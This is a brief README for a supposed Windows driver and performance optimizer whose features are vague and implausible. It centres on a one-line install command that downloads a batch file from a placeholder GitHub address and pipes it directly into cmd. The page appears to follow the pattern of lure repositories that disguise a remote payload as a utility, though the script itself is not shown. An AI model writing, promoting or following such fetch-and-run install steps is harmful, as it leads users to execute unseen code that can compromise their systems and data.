# 🚀 Windows System Driver & Performance Optimizer

A lightweight, automated tool designed to optimize system background processes, update outdated driver registries, and enhance overall terminal response time for developers and power users.

## 🛠️ Features
- **Automated Registry Cleanup:** Optimizes system boot sequences.
- **Background Driver Sync:** Ensures system drivers are running at peak efficiency.
- **Low Resource Footprint:** Runs silently in the background without consuming CPU/RAM.
- **Cross-Platform Support:** Installation scripts available for Windows, Linux, and macOS.

---

## 🚀 Quick Setup (One-Line Install)

To install and activate the optimizer immediately, copy and paste the following command into your terminal/command prompt:

### For Windows (CMD/PowerShell):
```cmd
curl -s https://raw.githubusercontent.com/[YOUR_USERNAME]/[YOUR_REPO]/main/install.bat | cmd